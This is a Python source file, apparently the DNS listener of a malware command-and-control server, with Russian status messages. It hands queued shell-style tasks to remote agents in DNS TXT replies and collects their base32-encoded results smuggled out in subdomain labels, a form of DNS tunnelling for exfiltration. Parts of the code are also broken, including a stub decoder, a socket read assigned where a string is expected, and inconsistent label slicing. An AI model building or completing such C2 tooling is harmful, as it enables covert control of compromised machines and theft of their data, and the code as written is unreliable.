import socket
import struct

HOST = ('192.168.56.1', 53) #server address

def decode_base32(data :str) -> str:
    pass
    return ""


def run_dns(stop_event, task_manager):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0) as s:
        s.bind(HOST)
        print("[+/DNS] dns-слушатель работает.")
        
        while not stop_event.is_set():
            data, address = s.recvfrom(1024)

            #parse dns_packet
            agent_id = data[:2] #ID from agent
            idx = 12
            parts = []
            while True:
                length = data[idx]
                if length == 0:
                    break
                parts.append(data[(idx + 1):(idx + length + 1)].decode('utf-8'))
                idx += (length + 1)
            domain = '.'.join(parts) #domain from agent

            if domain[:-16] == "home":
                connection = task_manager.get_connection()

                try:
                    task = task_manager.get_next_task(connection, agent_id)
                    if task is None:
                        ans = b"null"
                    else:
                        #task[0] - task_id, task[1] - task_command
                        ans = f"{task[0]}|{task[1]}|".encode('utf-8')
                        print("[+/DNS]Задача отправлена агенту.")

                        #FORMING DNS_PACKET_ANSWER
                        #forming HEADER
                        flags = b'\x85\x00' #QR=1 and AA=1
                        qdcount = b'\x00\x01' #count question
                        ancount = b'\x00\x01' #count response
                        nscount = b'\x00\x00'
                        arcount = b'\x00\x00'
                        header = agent_id + flags + qdcount + ancount + nscount + arcount
                        #forming QUESTION
                        question = data[12:(idx + 5)]
                        #forming ANSWER
                        name = b'\xc0\x0c' #offset for name_domain
                        type_answer = b'\x00\x10' #type=TXT
                        class_dns = b'\x00\x01' #class=IN 
                        TTL = b'\x00\x00\x00\x00' #TTL=0sec
                        rdlength = struct.pack("!H", len(ans) + 1)
                        rdata = bytes([len(ans)]) + ans
                        answer = name + type_answer + class_dns + TTL + rdlength + rdata

                        dns_packet_answer = header + question + answer

                        s.sendto(dns_packet_answer, address)

                finally:
                    connection.close()

            elif domain[:-16][-1:] == "r":
                result_tmp = {}
                task_id = domain[:-18][-2:]

                while True:
                    if domain[:-21][-3:] == "end":
                        break
                    result_tmp[domain[:-21][-2:]] = domain[:-24]
                    domain = s.recvfrom(1024)

                result_tmp[999] = domain[:-25]
                
                result_base32_tmp = [result_tmp[i] for i in sorted(result_tmp.keys())]
                result_base32 = "".join(result_base32_tmp)

                #result = decode_base32(result_base32)
                
                connection = task_manager.get_connection()

                try:
                    task_manager.complete_task(connection, task_id, result_base32)
                    
                    print(f"[+/DNS] Получен результат по задаче ({task_id}).")
                finally:
                    connection.close()

    print("[+/DNS] dns-слушатель прекратил работу.")
